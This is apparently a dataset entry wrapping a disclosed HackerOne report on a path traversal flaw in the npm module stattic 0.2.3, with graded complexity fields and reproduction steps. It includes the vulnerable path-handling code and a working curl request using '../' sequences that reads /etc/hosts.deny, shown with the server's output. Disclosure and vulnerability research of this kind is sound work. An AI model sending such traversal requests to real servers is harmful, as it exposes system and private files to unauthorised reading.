@@ -1,0 +1,42 @@
+{
+  "reported_to": "Node.js third-party modules",
+  "reported_by": "bl4de ",
+  "title": "[stattic] Inproper path validation leads to Path Traversal and allows to read arbitrary files with any extension(s)",
+  "content": "\nI would like to report Path Traversal in stattic module.\nIt allows to read content of some arbitrary files from the server where stattic is installed and run.\nModule\nmodule name: stattic\nversion: 0.2.3\nnpm page: https://www.npmjs.com/package/stattic\nModule Description\nRidiculous simple script for serving static files using http module.\nModule Stats\nStats\n7 downloads in the last day\n32 downloads in the last week\n77 downloads in the last month\n~900 estimated downloads per year\nVulnerability Description\nPath Traversal vulnerability in stattic module allows to go up in directory tree and read content of some files outside of the root path set up in the module config.\nHowever, this issue allows to read only files with extension, because if no extension is provided, stattic by default uses setting from options.index variable.\nSteps To Reproduce:\nInstall stattic module:\nCode 21 Bytes\n1$ npm install stattic\nCreate sample application:\nCode 208 Bytes\n1// app.js\n2//Import libs\n3var stattic = require('stattic');\n4 \n5//Set the folder with the static files\n6stattic.set('folder', './');\n7 \n8//Set the port\n9stattic.set('port', 8080);\n10 \n11//Run the server\n12stattic.listen();\nRun application:\nCode 13 Bytes\n1$ node app.js\nHere's the part of stattic code responsible for handling paths:\nCode 442 Bytes\n1// node_modules/stattic/index.js, line 70:\n2\n3    //Parse the request url and get only the pathname\n4    var pathname = url.parse(req.url).pathname;\n5\n6    //Resolve to the local folder\n7    var local_path = path.join(options.folder, pathname);\n8\n9    //Check the extension\n10    if(path.extname(local_path) === '')\n11    {\n12      //Add the index file to the local path\n13      local_path = path.join(local_path, './' + path.basename(options.index));\n14    }\n15\nIf file provided has no extension, / and options.index are added (by default, it will become /index.html). This causes that eg. /etc/passwd path become /etc/passwd/index.html, but /etc/hosts.deny is valid filename and can be read:\nCode 1.11 KiB\n1$ curl -v --path-as-is http://localhost:8080/../../../../../etc/hosts.deny\n2*   Trying ::1...\n3* Connected to localhost (::1) port 8080 (#0)\n4> GET /../../../../../etc/hosts.deny HTTP/1.1\n5> Host: localhost:8080\n6> User-Agent: curl/7.47.0\n7> Accept: */*\n8> \n9< HTTP/1.1 200 OK\n10< Content-Type: null\n11< Date: Fri, 23 Feb 2018 12:36:35 GMT\n12< Connection: keep-alive\n13< Transfer-Encoding: chunked\n14< \n15# /etc/hosts.deny: list of hosts that are _not_ allowed to access the system.\n16#                  See the manual pages hosts_access(5) and hosts_options(5).\n17#\n18# Example:    ALL: some.host.name, .some.domain\n19#             ALL EXCEPT in.fingerd: other.host.name, .other.domain\n20#\n21# If you're going to protect the portmapper use the name \"rpcbind\" for the\n22# daemon name. See rpcbind(8) and rpc.mountd(8) for further information.\n23#\n24# The PARANOID wildcard matches any host whose name does not match its\n25# address.\n26#\n27# You may wish to enable this to ensure any programs that don't\n28# validate looked up hostnames still leave understandable logs. In past\n29# versions of Debian this has been the default.\n30# ALL: PARANOID\n31\n32* Connection #0 to host localhost left intact\nPatch\nProbably some protection against typical Path Traversal exploitation methods should be introduced here.\nSupporting Material/References:\nOperating system: Ubuntu 16.04\nNode.js 8.9.4\nnpm v. 5.6.0\ncurl 7.47.0\nWrap up\nI contacted the maintainer to let him know: [N]\nI opened an issue in the related repository: [N]\nRegards,\nRafal 'bl4de' Janicki\nImpact\nPath Traversal vulnerability in stattic module allows to go up in directory tree and read content of some files outside of the root path set up in the module config.\n\n",
+  "severity": [
+    8.6,
+    null
+  ],
+  "bounty": null,
+  "weaknesses": [
+    "Path Traversal"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1520391840,
+  "report_url": "https://hackerone.com/reports/319003",
+  "is_multi_component": false,
+  "complexity": "LOW",
+  "novelty": "LOW",
+  "vuln_category": "CODE",
+  "steps": [
+    [
+      1,
+      "Install stattic module: npm install stattic"
+    ],
+    [
+      2,
+      "Create and run a sample application using stattic with default settings"
+    ],
+    [
+      3,
+      "Use curl to request a file outside the root directory with an extension (e.g., /etc/hosts.deny)"
+    ]
+  ],
+  "vuln_description": "Path Traversal vulnerability in the stattic module allows reading arbitrary files outside the configured root directory by exploiting improper path validation. The vulnerability is limited to files with extensions due to the module's default behavior of appending an index file to paths without extensions.",
+  "reason": "The vulnerability involves a straightforward exploitation of path traversal by manipulating the URL path. The attack does not require complex interactions or state manipulation, and the logic is common in similar vulnerabilities.",
+  "new_complexity": "LOW",
+  "requires_code": true,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": null
+}
